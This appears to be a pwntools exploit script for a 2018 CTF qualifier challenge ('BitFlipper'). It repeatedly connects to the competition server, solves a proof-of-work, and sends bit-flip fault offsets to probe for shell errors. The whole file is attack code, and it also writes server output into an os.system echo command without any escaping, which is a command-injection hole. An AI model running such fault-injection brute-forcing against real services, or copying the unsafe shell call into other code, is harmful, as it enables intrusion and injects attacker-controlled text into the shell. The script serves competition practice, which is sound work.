#!/usr/bin/env python
from pwn import *
import os

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

		
k=4
		
while(True):
	conn = remote('61421a06.quals2018.oooverflow.io', 5566)

	print(conn.recvline('Challange: ')),
	Challange = conn.recvline()[11:].strip()
	print(Challange)

	print(conn.recvuntil("n: ")),
	n=conn.recvline().strip()
	print(n)

	challenge = Challange
	n = int(n)
	print('Solving challenge: "{}", n: {}'.format(challenge, n))

	solution = solve_pow(challenge, n)
	print(conn.recvuntil("Solution:")),
	print(solution)

	conn.sendline(str(solution))

	## BitFlipper.py pwn

	print(conn.recvuntil("How many faults you want to introduce?"))
	conn.sendline("4")
	conn.sendline("1")
	for c in range(3):
		conn.sendline(str(k+c*8))
	#conn.interactive()
	k=k-24
	
	print(conn.recvuntil("------------------------------------------------------"))
	Error = conn.recvuntil("------------------------------------------------------")
	print(Error)
	
	if "bash" in Error:
		print("good")
		print("k : "),
		print(k)
		if "bash: ./dir:" not in Error:
			os.system("echo '"+Error+"' >> ErrorCollect.txt")
		else:
			os.system("echo '"+Error+"' > DirErrorCollect.txt")

	conn.close()




